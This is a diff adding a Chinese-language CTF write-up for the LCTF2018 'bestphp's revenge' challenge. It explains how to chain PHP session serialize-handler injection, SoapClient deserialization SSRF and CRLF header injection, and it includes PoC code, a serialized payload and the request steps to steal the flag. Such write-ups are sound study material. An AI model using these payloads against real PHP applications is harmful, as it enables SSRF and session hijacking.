@@ -1865,6 +1865,140 @@ so:
     ?>
     ```
 
+#### bestphp's revenge
+
+##### 知识点
+
+**session反序列化->soap(ssrf+crlf)->call_user_func激活soap类**
+
+1. SoapClient触发反序列化导致ssrf
+2. serialize_hander处理session方式不同导致session注入
+3. crlf漏洞
+
+##### 解题思路
+
+首先，php反序列化没有可利用的类时，可以调用php原生类，参考[反序列化之PHP原生类的利用](https://xz.aliyun.com/t/13785?time__1311=mqmxnQKGqQwx9DBqDTeeqBKMk8IFG87D27eD&alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fsearch%3Fkeyword%3D%25E5%258E%259F%25E7%2594%259F%25E7%25B1%25BB)
+
+```php
+//index.php
+<?php
+highlight_file(__FILE__);
+$b = 'implode';
+call_user_func($_GET[f],$_POST);
+session_start();
+if(isset($_GET[name])){
+    $_SESSION[name] = $_GET[name];
+}
+var_dump($_SESSION);
+$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
+call_user_func($b,$a);
+?>
+```
+
+```php
+//flag.php
+session_start();
+echo 'only localhost can get flag!';
+$flag = 'LCTF{*************************}';
+if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
+       $_SESSION['flag'] = $flag;
+   }
+only localhost can get flag!
+```
+
+`f`传入`extract`覆盖b为我们想要的函数，问题是后面session的利用。
+
+先说`SoapClient`，参考[从几道CTF题看SOAP安全问题](https://www.cnblogs.com/20175211lyz/p/11515519.html)
+
+>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。
+其采用HTTP作为底层通讯协议，XML作为数据传送的格式
+SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。
+
+**那么如果我们能通过反序列化调用SoapClient向flag.php发送请求，那么就可以实现ssrf**
+
+接下要解决的问题是：
+
+   - 在哪触发反序列化
+   - 如何控制反序列化的内容
+
+这里要知道`call_user_func()`函数如果传入的参数是`array`类型的话，会将数组的成员当做类名和方法，例如本题中可以先用`extract()`将`b`覆盖成`call_user_func()`，`reset($_SESSION)`就是`$_SESSION['name']`，我们可以传入`name=SoapClient`，那么最后`call_user_func($b, $a)`就变成`call_user_func(array('SoapClient','welcome_to_the_lctf2018'))`,即`call_user_func(SoapClient->welcome_to_the_lctf2018)`，由于`SoapClient`类中没有`welcome_to_the_lctf2018`这个方法，就会调用魔术方法`__call()`从而发送请求
+
+控制Soap的内容poc
+```php
+<?php
+$target = "http://127.0.0.1/flag.php";
+$attack = new SoapClient(null,array('location' => $target,
+    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=123456\r\n",
+    'uri' => "123"));
+$payload = urlencode(serialize($attack));
+echo $payload;
+```
+
+这里又涉及到crlf，参考[CRLF Injection漏洞的利用与实例分析](https://www.jianshu.com/p/d4c304dbd0af)
+
+>CRLF是”回车(%0d)+换行(%0a)”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。
+
+这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为PHPSESSID=123456的session中。
+
+最后一点，就是如何让php反序列化结果可控。这里涉及到php反序列的机制。
+
+>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。
+存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。
+在php.ini中存在三项配置项
+
+```lua
+session.save_path=""   --设置session的存储路径
+session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
+session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)
+```
+
+PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：
+
+|处理器|对应存储格式|
+|------|-----------|
+|php|键名 + 竖线 + 经过serialize()函数反序列化处理的值|
+|php_binary|键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数反序列化处理的值|
+|php_serialize(php>=5.5.4)|经过serialize()函数反序列处理的数组|
+
+配置选项 `session.serialize_handler`，通过该选项可以设置序列化及反序列化时使用的处理器。
+如果PHP在反序列化存储的`$_SEESION`数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的伪造，甚至可以伪造任意数据。
+
+当存储是`php_serialize`处理，然后调用时php去处理，如果这时注入的数据时`a=|O:4:"test":0:{}`，那么session中的内容是`a:1:{s:1:"a";s:16:"|O:4:"test":0:{}";}`，那么`a:1:{s:1:"a";s:16:"`会被php解析成键名，后面就是一个test对象的注入。
+
+正好我们一开始的`call_user_func`还没用，可以构造`session_start(['serialize_handler'=>'php_serialize'])`达到注入的效果。
+
+##### 解题步骤
+
+1. 写入session
+    ```php
+    <?php
+    $target = "http://127.0.0.1/flag.php";
+    $attack = new SoapClient(null, array(
+        'location' => $target,
+        'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=817olmp68ukmnofc2mlp762ql0\r\n",
+        'uri' => "123"
+    ));
+    $payload = urlencode(serialize($attack));
+    echo $payload;
+    ```
+
+    生成payload，然后在前面加个|
+    ```uri
+    ?name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3D817olmp68ukmnofc2mlp762ql0%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&f=session_start
+
+    POST:
+    serialize_handler=php_serialize
+    ```
+2. 触发反序列化使SoapClient发送请求
+    ```uri
+    ?f=extract
+
+    POST:
+    b=call_user_func
+    ```
+3. 修改cookie
+
+将cookie修改成第一步中poc中设置的值发起请求拿到flag。
 
 ## python反序列化
 
